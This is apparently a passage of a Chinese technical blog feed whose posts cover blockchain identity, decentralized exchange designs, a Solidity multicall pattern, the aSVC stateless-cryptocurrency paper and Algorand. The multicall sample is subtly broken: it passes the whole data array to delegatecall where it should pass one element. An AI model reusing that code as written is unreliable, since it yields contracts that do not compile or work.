<p>一种观点是，该“操作数据库系统”Operation Database System可以在现有操作系统上进行改造。例如，在Linux内核的基础上增加一层共识层，该层主要由文件系统加解密，网络传输加解密以及共识协议等服务组成，为上层应用提供加解密和共识协议接口。</p>
<p>3）互链网网络模型</p>
<p>在“操作数据库系统”Operation Database System等基础上，互链网成为其上的应用，互链网需要链接各式各样的链。单链网需要具备的特性：<strong>高性能；安全性和隐私性；可扩展性；容错性</strong>。</p>
<p>组成链网，还需要的特性：多链式架构（同构/异构）；互通性；可延伸性（用户参与）；可更改性（用户加入/退出）；可复制性（快速同步）；可管理性及非对称结构（监管节点/域名服务/控制节点/种子节点等）；层次性（高层次的链和节点具有不对称的权利）；一致性（每条链具有自己的一致性，链与链之间也要有一致性）；高可靠性；完备性（共识机制及消息来源与可靠性不同，所以各链的完备性不一样。高完备性的链可以将信息传输给低完备性的链，反之，则不可以）</p>
<p><strong>身份信息处理方式分类：</strong></p>
<p>1）中心化处理：由政府发证，公民使用身份证来注册，交易，上学，就医等等。</p>
<p>2）联邦制处理：有另外一群组织来管理身份。</p>
<p>3）用户管理：个人管理身份。</p>
<p>4）用户自主管控：自我主权身份 self- sovereign identity。</p>
<p><strong>数据保护方面处理分类：</strong></p>
<p>1）不存储关键数据：例如，私钥，例如Sorvin项目就采取这样子的设计，但是这种设计使得系统操作性比较差，因为系统如果需要处理信息，每次都需要对数字身份发起请求，而且在请求协议中，也可能遭到攻击。</p>
<p>2）存储加密信息：在系统里面，关键信息都加密，每次客户使用公钥来读、写、传递加密信息。为了一直保证安全性，系统每隔一段时间需要更换私钥。</p>
<p>3）系统存储明文信息：部分操作系统例如内核是可以相信的，只有内核可以出来保密信息，许多作业都由硬件处理，由硬件来保护，这是目前传统可信操作系统的设计。如intel SGX（Software Guard Extensions），ARM TrustZone等技术。</p>
]]></content>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>关于chatGPT的认识</title>
    <url>/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<p>来自中科大校友，粤港澳大湾区数字经济研究院工程总监，曾任微软（中国）操作系统工程院院长，微软亚洲互联网工程院副院长，谢育涛，在2月19日的分享。</p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/1.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/2.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/3.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/4.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/5.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/6.jpg"></p>
<p><img src="/2023/02/21/%E5%85%B3%E4%BA%8EchatGPT%E7%9A%84%E8%AE%A4%E8%AF%86/7.jpg"></p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>去中心化的资产交易</title>
    <url>/2020/11/22/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E7%9A%84%E8%B5%84%E4%BA%A7%E4%BA%A4%E6%98%93/</url>
    <content><![CDATA[<h3 id="一、去中心化的KYC-AML"><a href="#一、去中心化的KYC-AML" class="headerlink" title="一、去中心化的KYC/AML"></a>一、去中心化的KYC/AML</h3><p>区块链可以被视为区块链中心化的证书颁发机构，可以将身份维护映射到公钥。智能合约还可以增加逻辑，实现ACL(权限赋予、撤销、恢复)，减轻用户的密钥管理负担。这通常称之为Self-sovereign Identity，目前DID(decentralized Identify)的标准初稿已经发布。</p>
<h3 id="二、去中心化的自动做市商、订单薄以及订单撮合"><a href="#二、去中心化的自动做市商、订单薄以及订单撮合" class="headerlink" title="二、去中心化的自动做市商、订单薄以及订单撮合"></a>二、去中心化的自动做市商、订单薄以及订单撮合</h3><h5 id="（一）自动做市商模式"><a href="#（一）自动做市商模式" class="headerlink" title="（一）自动做市商模式"></a>（一）自动做市商模式</h5><p>典型代表有Uniswap、Bancor和Kyber。</p>
<p>Bancor和Kyber都采用了中央对手方模式提供交易流动性，其中央对手方是区块链上的一个智能合约。</p>
<p>Bancor交易流程：1）Taker找到一个以代币A和B为储备代币的Bancor合约，向合约中转入储备代币A，获得智能代币A_B_RESERVE，兑换价格有智能合约根据公式计算；2）Taker向智能代币合约转入智能代币A_B_RESERVE，获取储备代币B。</p>
<p>Kyber交易流程：1）Makers向智能合约写入他们的交易报价和数量信息；2）Takers查询链上的报价信息，并根据报价发送自己的订单；3）交易所合约执行交易并通知交易双方。</p>
<p>因此不存在违约的风险。两者的差异在Bancor提供的买卖报价是根绝其储备资产动态计算的，而Kyber的报价则由储备员持续更新。</p>
<h5 id="（二）订单撮合模式"><a href="#（二）订单撮合模式" class="headerlink" title="（二）订单撮合模式"></a>（二）订单撮合模式</h5><h6 id="1）链上订单簿"><a href="#1）链上订单簿" class="headerlink" title="1）链上订单簿"></a>1）链上订单簿</h6><p>Ripple、Stellar、Etherdelta、<a href="https://oasisdex.com/">OasisDex</a>、<a href="https://dydx.exchange/">dYdX</a>、Bitshares等项目采用链上订单簿模式，所有未完成的挂盘订单都会记录在区块链上的订单集（Order Book）中，订单集中的订单能否成交都取决于买卖方的挂盘及交易时设定的成交策略。在买卖盘的资产匹配时，跨资产类型的交易可以通过挂盘直接成交方式完成；在Ripple/Stellar中，若无直接匹配的资产，则网络会在订单集中寻找可以利用中间资产达成买卖交易的交易路径。</p>
<p>Etherdelta的技术方案中，充值、提现、挂单、结算全部由智能合约完成。基本思路是：maker用私钥签名一笔订单，提交到链上，maker挂单时可以选择在多少个区块后若订单未成交则自动取消。随后，taker从订单簿中选择想要成交的订单，生成对应的交易，交易签名后提交至链上智能合约。智能合约验证完成订单中交易者的签名和订单有效时间后，进行资金结算。Etherdelta没有自动撮合订单的机制，每笔交易需链上确定，其交易效率收到以太坊的影响，同时还可能因链上确认存在问题而导致成交失败。</p>
<p>链上订单簿模式的可用性存在一些问题，例如交易费用高、订单修改成本高、市场割裂导致深度不够等等。</p>
<h6 id="2）链外订单簿"><a href="#2）链外订单簿" class="headerlink" title="2）链外订单簿"></a>2）链外订单簿</h6><p>0x协议没有充值和提现过程，而是直接授权符合ERC20的智能合约进行token转账。其机制是：链下订单中继、链上最终结算。只有在结算时才上链。0x由中继链进行订单的托管和维护。中继链收取手续费，其事先创建了交易费用计划和地址。其规则时：中继链从交易者接受并检查订单，检查通过后将订单发至订单集，订单集完成处理后将订单提交给0x的智能合约，完成链上操作。</p>
<p>出于流动性共享的需求，0x以及airswap协议希望打通不同去中心化交易所的流动性壁垒，实现订单在不同交易所和relayer之间自由流转。以传统场外交易业务做对比，0x协议中relayer的角色和经纪商相似，提供订单转发和撮合服务，但交易的最终清算由订单的taker发起，无需经过relayer，由区块链直接结算，不存在违约风险。</p>
<p>0x和airswap协议目前都仅服务于ERC20的直接交易，对于低流动性资产有一定的局限性。</p>
<p>0x交易流程：1）Maker发送一个签名订单给Relayer(或则直接发送给Taker)；2）Taker向Relayer查询未成交订单；3）Taker选择一个订单进行匹配；4）Taker向交易所合约提交订单。</p>
<p>airswap交易流程：1）Maker广播一个交易对表明成交意愿，给到Indexer；2）Taker向Indexer查询交易对；3）Taker获取到可作为交易对手方的Maker信息；4）Maker和Taker直接协商一个合适的交易条件；5）Taker向交易所合约提交订单，执行交易。</p>
<h3 id="三、去中心化的清结算服务"><a href="#三、去中心化的清结算服务" class="headerlink" title="三、去中心化的清结算服务"></a>三、去中心化的清结算服务</h3><h5 id="（一）备付金模式"><a href="#（一）备付金模式" class="headerlink" title="（一）备付金模式"></a>（一）备付金模式</h5><p>Taker事先使用现金，兑换成为ERC20 Token—和现金1:1，存入区块链账户；同时，该Token可以在交易所随意兑换成为现金。交易时，使用该Token进行原子交易。此方式不存在资金违约的情况。</p>
<h5 id="（二）信用模式"><a href="#（二）信用模式" class="headerlink" title="（二）信用模式"></a>（二）信用模式</h5><p>Taker根据自身的信用，在交易所内即可透资一定额度；同时，该Token额度不可以在交易所兑换成为现金。交易时，使用该Token进行原子交易。Maker侧可以使用该Token兑换现金，由银行（或者交易所）垫付，垫付资金即为短期贷款，此方式存在资金违约的可能。</p>
<h5 id="（三）跨链清结算"><a href="#（三）跨链清结算" class="headerlink" title="（三）跨链清结算"></a>（三）跨链清结算</h5><p>如哈希锁定（hash-locking，如雷电网络）、侧链（sidechains，如开发进行中的cosmos）、公证人（notary schemes，如Interledger）</p>
<h3 id="四、去中心化的行情发布"><a href="#四、去中心化的行情发布" class="headerlink" title="四、去中心化的行情发布"></a>四、去中心化的行情发布</h3><p>优点：区块链的开放性。价格信息的多种来源，不存在信息垄断，有助于促进市场竞争，使整个市场价格更为透明与高效。</p>
<p>风险：某些局部市场因流动性不足，易于被操纵，恶意的交易者可以发布虚假订单，伪造成交量，或则针对不同交易协议的弱点进行攻击，以达到影响全局市场的目的。</p>
<p>因此，去中心化交易的体系中建立合理的行情发布机制，既实现价格透明，同时又保障全局价格的真实性。</p>
<h3 id="五、去中心化交易所的监管合规"><a href="#五、去中心化交易所的监管合规" class="headerlink" title="五、去中心化交易所的监管合规"></a>五、去中心化交易所的监管合规</h3><p>充分借助科技监管（区块链、大数据、人工智能等）：设置监管接入点，对节点运行、合约代码进行技术巡查；对KYC、AML、信息披露、风险监测进行实时报送。对项目尽调、风险评级展开详尽的调查和分析。</p>
<h3 id="六、与传统中心化交易的对比分析"><a href="#六、与传统中心化交易的对比分析" class="headerlink" title="六、与传统中心化交易的对比分析"></a>六、与传统中心化交易的对比分析</h3><h5 id="（一）安全性"><a href="#（一）安全性" class="headerlink" title="（一）安全性"></a>（一）安全性</h5><p>区块链在系统弹性、可靠性、健壮性上具有较好应对节点故障的能力。</p>
<p>在去中心化交易所中，有可能存在设计上的缺陷而被黑客攻击，甚至导致Token被非法转移的情况。</p>
<h5 id="（二）交易性能"><a href="#（二）交易性能" class="headerlink" title="（二）交易性能"></a>（二）交易性能</h5><p>较快的去中心化交易所可以达到2s的要以延时，1000的系统吞吐量，相对于1ms的成盘速度的传统证券交易所系统，在性能上还有较大的差距。</p>
<p>（三）结算风险</p>
<p>区块链中，资产转移指令和现金转移指令同时作为单个交易的最后一步执行，无结算风险。但对于跨链资产交易，可能面临结算风险。</p>
<p>（四）隐私保护</p>
<p>传统中心化交易中，用户入场需要经过身份认证，且交易过程完全由中心机构记录，若监管缺失，可能导致大量敏感信息泄露。去中心化的方案可以更好地解耦用户敏感信息存储与用户资金交易。</p>
]]></content>
      <tags>
        <tag>资产交易</tag>
      </tags>
  </entry>
  <entry>
    <title>单个合约中多个交易的模式</title>
    <url>/2023/04/20/%E5%8D%95%E4%B8%AA%E5%90%88%E7%BA%A6%E4%B8%AD%E5%A4%9A%E4%B8%AA%E4%BA%A4%E6%98%93%E7%9A%84%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>早期空头 NFT/ERC20 Token 的话，更多需要用户来做 withdraw。本文章的设计模式是由发行方来发送 NFT/ERC20 Token 给到用户。同样适用于多个资产同时转账的场景。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>合约接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IMulticall &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice           Takes an array of abi-encoded call data, delegatecalls itself with each calldata, and returns the abi-encoded result</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @dev              Reverts if any delegatecall reverts</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param    data    The abi-encoded data</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @returns  results The abi-encoded return values</span><br><span class="line">    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice           OPTIONAL. Takes an array of abi-encoded call data, delegatecalls itself with each calldata, and returns the abi-encoded result</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @dev              Reverts if any delegatecall reverts</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param    data    The abi-encoded data</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param    values  The effective msg.values. These must add up to at most msg.value</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @returns  results The abi-encoded return values</span><br><span class="line">    function multicallPayable(bytes[] calldata data, uint256[] values) external payable virtual returns (bytes[] memory results);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>multicallPayable 是可选的，因为由于 msg.value，它并不总是可行的。</p>
<p>以下是最为简陋的实现方式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; Derived from OpenZeppelin&#39;s implementation</span><br><span class="line">abstract contract Multicall is IMulticall &#123;</span><br><span class="line">    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) &#123;</span><br><span class="line">        results &#x3D; new bytes[](data.length);</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            (bool success, bytes memory returndata) &#x3D; address(this).delegatecall(data);</span><br><span class="line">            require(success);</span><br><span class="line">            results[i] &#x3D; returndata;</span><br><span class="line">        &#125;</span><br><span class="line">        return results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>multicallPayable 只应在合约能够支持时使用。以上实现可能允许攻击者使用相同的以太币多次调用支付函数。</p>
<h3 id="调用方法-测试方法"><a href="#调用方法-测试方法" class="headerlink" title="调用方法/测试方法"></a>调用方法/测试方法</h3><p>以下 JavaScript 代码使用 Ethers 库，应自动将 ERC-20 Token 的 amt 单位传输到地址 A 和地址 B。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> token.multicall(<span class="keyword">await</span> <span class="built_in">Promise</span>.all([</span><br><span class="line">    token.interface.encodeFunctionData(<span class="string">&#x27;transfer&#x27;</span>, [ addressA, amt ]),</span><br><span class="line">    token.interface.encodeFunctionData(<span class="string">&#x27;transfer&#x27;</span>, [ addressB, amt ]),</span><br><span class="line">]));</span><br></pre></td></tr></table></figure>

<h3 id="完整工程"><a href="#完整工程" class="headerlink" title="完整工程"></a>完整工程</h3><p>如下：</p>
<p><a href="https://github.com/willzhuang/multicall">https://github.com/willzhuang/multicall</a></p>
<p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-6357.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-6357.md</a></p>
]]></content>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>可聚合子向量承诺应用于无状态加密货币</title>
    <url>/2020/06/20/%E5%8F%AF%E8%81%9A%E5%90%88%E5%AD%90%E5%90%91%E9%87%8F%E6%89%BF%E8%AF%BA%E5%BA%94%E7%94%A8%E4%BA%8E%E6%97%A0%E7%8A%B6%E6%80%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/</url>
    <content><![CDATA[<p>将可聚合子向量承诺应用于无状态加密货币 ==&gt; <a href="https://eprint.iacr.org/2020/527.pdf">https://eprint.iacr.org/2020/527.pdf</a></p>
<h3 id="0-摘要"><a href="#0-摘要" class="headerlink" title="0.摘要"></a>0.摘要</h3><p>可聚合子向量承诺（aSVC, An aggregatable subvector commitment）方案是一种向量承诺（VC）方案，可以将多个证明聚合到单个小的子向量证明中。本文中，我们对aSVC进行了形式化处理，通过恒定大小的多项式承诺，给出了素数阶组的有效构造，并使用它来引向高效的无状态加密货币。</p>
<p>aSVC支持：</p>
<ul>
<li><p>在 O(n log n) 时间内计算所有n个 O(1) 大小的证明</p>
</li>
<li><p>在 O(1) 时间内更新证明</p>
</li>
<li><p>将b个证明汇总到 O(1) 大小的子向量证明，时间为 O(b log2 b)。</p>
</li>
</ul>
<p>重要的是，我们的方案具有 O(n) 大小的证明密钥，O(1) 大小的验证密钥和 O(1) 大小的更新密钥。相比之下，先前在素数阶组中具有恒定大小证明的方案：</p>
<ul>
<li><p>需要 O(n2) 时间来计算所有证明</p>
</li>
<li><p>需要 O(n) 大小的更新密钥来更新 O(1) 中的证明时间</p>
</li>
<li><p>或不支持汇总证明。</p>
<p>此外，基于隐藏顺序组的方案：</p>
</li>
<li><p>具有更大的具体证明大小和计算时间</p>
</li>
<li><p>不支持证明更新</p>
</li>
</ul>
<p>我们使用aSVC具有非常低的通信和计算开销，在此基础上，构建无状态加密货币。 具体来说，大小固定的可聚合证明将每个块的证明开销减少到一个组元素。 相反，以前的工作需要O(b log n)组元素，其中b是每个块的交易数。 此外，较小证明将区块验证时间从O(b log n)配对减少到只有两个配对和O(b)大小的多幂运算。最后，与先前工作中的O(b log n)相比，aSVC较小的更新密钥仅占用O(b)区块空间。同样，它们的可验证性将矿工存储从O(n)减少到O(1)。最终结果将是一种无状态的加密货币超过了现有技术。</p>
<h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>在无状态加密货币中，矿工和加密货币用户都不需要存储完整的区块链。取而代之的是，使用经过身份验证的数据结构（ADS, authenticated data structure）对由用户帐户余额组成的区块链状态进行身份验证。这样，矿工仅存储区块链状态的简要摘要。 尽管如此，矿工仍然可以验证用户发送的交易，这些用户现在提供了他们有足够余额的证明。 此外，矿工仍可以提议新的区块，并且用户可以在新区块发布时轻松地同步或更新其证明。</p>
<p>由于无状态加密货币的诸多优势，已引起越来越多的关注：</p>
<ul>
<li>针对摘要的无状态事务验证要比针对已存储数据库的有状态验证更好地扩展</li>
<li>无状态加密货币消除了矿工或整个节点验证区块所需的数百GB的存储空间</li>
<li>无状态性通过允许矿工有效地从一个碎片切换到另一个碎片，使碎片变得更加容易</li>
<li>由于验证块是无状态且高效的，因此任何人都可以成为完整节点，从而产生更具弹性的分布式加密货币</li>
</ul>
<p>先前的工作显示了如何使用RSA累加器或Merkle哈希树有效地获取基于UTXO的无状态加密货币。但是，对于基于帐户的加密货币，当前的解决方案要么具有比理想的证明大小大的值，要么基于隐蔽的组，而后者实际上要慢一些。因此，本文的重点是改善基于帐户的无状态加密货币的具体和渐进复杂性。（在[Zah18，But16，Cor16，Pat17，Eth17，Yan16]中深入讨论了基于帐户和基于UTXO的设计的优缺点。）</p>
<p><strong>向量承诺（VC）中基于帐户的无状态加密货币。</strong>先前的工作开创了在任何矢量承诺（VC）方案之上构建基于帐户的无状态加密货币的想法。在较高级别，VC方案允许证明方计算向量v = [v0, v1, . . . , vn−1]的简洁承诺c，此处具有n个元素，其中vi∈Zp。重要的是，证明者可以生成证明πi，证明vi是v中位于位置i的元素，并且任何验证者都可以根据承诺c对其进行检查。</p>
<p>证明者需要证明密钥<strong>prk</strong>来提交向量并计算证明，而验证者需要验证密钥<strong>vrk</strong>来验证证明（通常|vrk| &lt;&lt; |prk|）。某些VC方案支持更新：如果向量中的一个或多个元素发生更改，则可以有效地更新承诺和证明。 为此，需要绑定到更新位置<strong>j</strong>的更新密钥<strong>upkj</strong>。证明，验证和更新密钥一起被称为VC的公共参数。</p>
<h4 id="1-1本文的贡献"><a href="#1-1本文的贡献" class="headerlink" title="1.1本文的贡献"></a>1.1本文的贡献</h4><p>如果基础VC具有：</p>
<ul>
<li><p>具有亚线性时间验证的亚线性大小的可更新证明</p>
</li>
<li><p>可更新承诺</p>
</li>
<li><p>亚线性大小的更新密钥</p>
</li>
</ul>
<p>则可以从VC有效地构建无状态加密货币。我们说这样的VC方案具有”可扩展的更新”。不幸的是，大多数VC没有可伸缩的更新，或者如果具有，它们的证明和更新密钥大小也并不理想。最后，虽然可以通过可伸缩的更新来增强隐藏顺序组中的方案，但是其具体性能与原始顺序组中的方案不匹配。在本文中，我们提出了一种具有可扩展更新的新型VC，它具有最佳的证明大小，并使用它来构建有效的无状态加密货币。</p>
<p><strong>具有可伸缩更新的可聚合子向量承诺（aSVC）</strong>。 我们提出了可聚合子向量承诺（aSVC）的新概念，即支持承诺更新，证明更新以及将证明聚合为子向量证明的SVC。 然后，我们构建了一个在配对友好组上具有可伸缩更新的aSVC。 我们的aSVC在多个方面都优于以前的工作：</p>
<ul>
<li>具有恒定大小的 I-subvector 证明：一组元素。</li>
<li>具有恒定大小的更新密钥：两个组元素（或在无状态加密货币设置中使用时，一个组元素）</li>
<li>它可以在O(1)时间内更新证明和承诺</li>
<li>它可以使用O(|<strong><em>I</em></strong>|)幂和O(|<strong><em>I</em></strong>| log2 |<strong><em>I</em></strong>|)场运算将多个证明快速聚合为 I-subvector </li>
<li>我们的aSVC可以通过用于多项式承诺的预计算证明的新技术，在O(n log n)时间内快速计算所有证明</li>
</ul>
<p>Vitalik提出一个新思想：使用部分分数分解来聚合多项式承诺中的证明。我们不仅使用此功能来汇总证明，还可以减少更新密钥的大小。此外，为了证明aSVC的安全性，我们必须加强<strong>KZG</strong>多项式承诺的安全性定义，并证明它们仍然可以满足aSVC。最后，aSVC可用于通过有效更新，可更新的基本零知识数据库，匿名凭证和无状态智能合约验证来改进可验证的数据库。</p>
<p>以下内容转自 ==&gt; <a href="https://mp.weixin.qq.com/s/ifelfFEsHc71SijQ5MC4jQ">https://mp.weixin.qq.com/s/ifelfFEsHc71SijQ5MC4jQ</a></p>
<p>不需要账本就能记账听上去不可思议，但其思路是简单的：在以前，节点有账本，一笔交易来后它翻看账本，查询交易是否合法；在以后，节点没有账本，交易发送方在提交交易的同时需要提交一个密码学证明（为了区分，后文特指密码学证明时都用proof表示），自己证明自己的这笔交易是合法的。</p>
<p>可出块节点为什么能够通过一个proof来判断某笔交易是否合法？这里涉及到两个密码学的重要概念，第一个叫<strong>「成员证明」</strong>。它指的是通过某种方法，证明个体是群体的一部分。如果能够证明某个账户状态是整个账本状态的一部分，出块节点当然就能相信这个账户状态，并以此为根据进行交易合法性的判断。第二个叫<strong>「向量承诺」</strong>，它可以将群体，不管这个群体有多庞大，压缩成仅仅一个数，然后给出成员证明，该成员证明表明的是某个个体是属于这个数背后所关联的群体的，且能证明个体在群体中的位置，以及进行证明的更新。</p>
<p>可聚合子向量承诺（aSVC）的工作过程是这样的：</p>
<ol>
<li><p>初始化分片，即在账本建立时确定账户的初始情况。假设某个分片建立时有100个账户，这些账户都有初始的余额，我们需要用v(i)代表第i个账户，它是（地址i，余额i）这样的一对值；用V代表全部账户，它是（地址1，余额1）（地址2，余额2）……（地址100，余额100）这样的一组值。同时需要生成两个值，第一个叫c，它是对V的承诺，代表的是此时该分片所有账户和账户里的余额。出块节点手中都握有c，（可以对比Merkle树根来便于理解），它是将来用于验证的摘要。第二个叫π(i)，它是对v(i) 是V的成员的证明，代表第i个账户及该账户的余额是在总账本V中。每个账户都握有且只握有自己的π(i)，它是将来发送交易时提交给出块节点的proof。在初始化阶段，承诺和证明的生成是需要初始「状态」的。</p>
</li>
<li><p>第一笔交易。账户 i 发起整个分片的第一笔交易，此时它需要把π(i)和交易一起提交给出块节点，出块节点对π(i)进行计算，看结果是否与自己手中的c相符合，如果一致就可以相信发送方账户确实有多少余额，并以此判断它提交的交易是否合法。</p>
</li>
<li><p>接下来是关键之处：对c和π(i)进行更新。</p>
</li>
</ol>
<p>c（对整个账本的承诺）不再是根据状态生成，它是用第一笔交易发生之前的c，以及第一笔交易引起的余额变动生成的；π(i)（账户对自己的证明）也不是根据状态生成，它是用第一笔交易发生之前的π(i)，以及第一笔交易对该账户的改变生成的。</p>
<p>在完成c和π(i)的更新之后，出块节点手中便有了可以承诺所有用户新余额的新承诺（新c），账户手中也有了可以证明自己新余额的新proof（新π(i)）。</p>
<p>以此类推，每笔交易都会改变一次c，改变一次全部π(i)，但这种改变不再依赖于状态数据，它取决于旧的c和π(i)，以及上一笔交易；当需要验证一笔新交易时，出块节点手中总有最新的c，它通过c和账户提供的π(i)就能判断某笔交易是否合法，是否可被打包进区块。</p>
<p>那么到这一步，就终于实现了「不需要账本就能记账」，不管对于出块节点，还是对于账户，它们手中握着的都是某种密码学的证明，而不是账本的状态。另需一提的是，无状态与分片似乎是绝配，但无状态并不是针对分片的一种设计，它是针对公链的一种设计。</p>
<p>aSVC的设计目标是要成为一个高效的成员证明，降低上述过程中的通信开销和计算开销，使得这种方案可用于无状态区块链的实现。从论文来看，使用aSVC方案，c和π(i)的大小仅为几十个字节，π(i)的更新时间为O(1)，验证时间也为O(1)，该方案还支持把多个proof聚合为一个O(1)大小的proof，这种低开销的实现正是aSVC的意义所在。不过就像Vitalik在以太坊研究者论坛中展开的相关讨论，aSVC还需要做进一步的优化。</p>
<p>文章的最后是对全文的简要总结：分布式系统的状态分片设计与密码学的成员证明设计相结合，实现以太坊2.0在性能上突破。</p>
<ol>
<li><p>为了安全，以太坊2.0的状态分片需要随机分配出块节点。</p>
</li>
<li><p>如果出块节点需要账本，账本同步会成为新的性能瓶颈，账本存储也会影响PoS的去中心化。</p>
</li>
<li><p>是否有不需要账本就能验证余额的方式？</p>
</li>
<li><p>第一个思路转变：把查找账本的方式改为证明账本的方式。这需要借助于密码学来完成。</p>
</li>
<li><p>第二个思路转变：把证明账本状态的方式改为证明交易行为的方式，实现无状态和无需账本的记账。这需要借助于密码学来完成。</p>
</li>
<li><p>密码学的工具有很多，当有了目标后，需要根据应用需求选择和组合适当的工具形成方案，并对方案进行优化。</p>
</li>
</ol>
<p>在文章中我们用自然语言描述了aSVC的工作，如果你感兴趣，可以通过aSVC 的API定义来更清晰地了解它。如下图所示：第一个红框是初始化时生成承诺c，第二个红框是根据交易更新c；第一个绿框是初始化时生成证明π(i)，第二个绿框是根据交易更新π(i)；蓝框是出块节点用c和π(i)做验证。</p>
<p><img src="/2020/06/20/%E5%8F%AF%E8%81%9A%E5%90%88%E5%AD%90%E5%90%91%E9%87%8F%E6%89%BF%E8%AF%BA%E5%BA%94%E7%94%A8%E4%BA%8E%E6%97%A0%E7%8A%B6%E6%80%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/1.png"></p>
<p>在上述过程中，最核心的工作是**根据交易引发的变动把旧的c变成新的c，把旧的π(i)变成新的π(i)**。不但要能够完成更新，且这种更新的开销是可以被接受的，这是aSVC要解决的关键问题。我们以c的更新为例来介绍aSVC是如何做的。</p>
<p>如前文所述，c承诺的是V，从c到新c，实际上就是从承诺V到承诺一个新的V。对V来说，它是由一系列的点构成的，（地址1，余额1）是一个点，（地址2，余额2）是另一个点……（地址100，余额100）是第100个点。</p>
<p>借助于拉格朗日插值法，可以把这一系列的点变成一个多项式（该多项式代表的曲线经过所有这些点），这意味着可以把对一系列点的承诺变成对一个多项式的承诺；从c到新c，也就等价于从承诺一个多项式到承诺另一个多项式。</p>
<p>而<strong>多项式有着各种神奇的属性，对多项式及多项式变换的承诺可以是小的、快速的</strong>。那么通过这种从点到多项式的转化，就可以把c的更新开销变为可接受的。</p>
<p>但这只是对aSVC方案思路的一个简单、片面的介绍，在该方案中还使用了诸多其他工具和方法，而且它依然在追求更好的设计。</p>
<p>如果你想更多的了解它，可以去阅读原论文，其中的3.1节和4.1节是最有助于理解整篇论文的部分。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>可验证随机函数VRF之Algorand共识算法</title>
    <url>/2018/03/31/%E5%8F%AF%E9%AA%8C%E8%AF%81%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0VRF%E4%B9%8BAlgorand%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>2018年2月，图灵奖得主、MIT教授Sivio Micali募集400万美元开发Algorand区块链协议一事受到了国内外媒体的普遍关注。在MITMicali教授和MIT媒体实验室数字货币计划负责人Neha Narula合开课程《共享公共账本》(Shared Public Ledger)课程。这门课主要就是讲解Algorand。Algorand的目标是建立一个低能耗、高速度、民主化、可拓展性好而且几乎不会出现分叉的分布式账本。Algorand没有引入激励机制或发行数字加密货币。</p>
<p>论文发表In Proceedings of the 26th ACM Symposium on Operating Systems Principles (SOSP), Shanghai, China, October 2017.：</p>
<ul>
<li><a href="nickolaihttps://people.csail.mit.edu/nickolai/papers/gilad-algorand.pdf">Algorand: Scaling Byzantine Agreements for Cryptocurrencies</a></li>
</ul>
<p>Algorand由algorithm(算法)和random(随机)两个词合成，顾名思义，就是基于随机算法的公共账本协议(public ledger)。Algorand针对比特币区块链系统的几个核心缺陷进行了改进。</p>
<h3 id="1-Algorand的目标是："><a href="#1-Algorand的目标是：" class="headerlink" title="1. Algorand的目标是："></a>1. Algorand的目标是：</h3><ol>
<li>能耗低，不管系统中有多用户，大约每1500名用户中只有1名会被系统挑中执行长达几秒钟的计算。</li>
<li>民主化，不会出现类似比特币区块链系统的“矿工”群体。</li>
<li>出现分叉的概率低于一兆分之一。假设Algorand中平均每分钟产生一个区块(后文会给出有关测试数据)，这个概率意味着平均每190万年出现一次分叉。</li>
<li>可拓展性好。</li>
</ol>
<h3 id="2-Algorand算法假设"><a href="#2-Algorand算法假设" class="headerlink" title="2. Algorand算法假设"></a>2. Algorand算法假设</h3><ol>
<li>网络中诚实节点的数目始终占优。</li>
